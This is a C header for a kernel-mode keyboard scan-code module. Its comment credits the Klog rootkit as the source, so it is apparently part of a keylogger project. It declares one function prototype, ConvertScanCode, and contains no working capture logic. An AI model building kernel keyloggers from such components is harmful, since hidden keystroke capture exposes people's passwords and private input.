/*
 * Module: obscancode.h
 * Author: Christopher Wood
 * Description: Keyboard scan code header.
 * Environment: Kernel mode only
 *
 * Adapted from Klog rootkit by Clandestine
 */

#ifndef OBSCANCODE_H_
#define OBSCANCODE_H_

#include "Ntifs.h"

/* Prototypes */
VOID ConvertScanCode(IN PDEVICE_EXTENSION pDevExt, IN PKEY_DATA keyData, OUT char* keys); // for use with exteneded key map

#endif
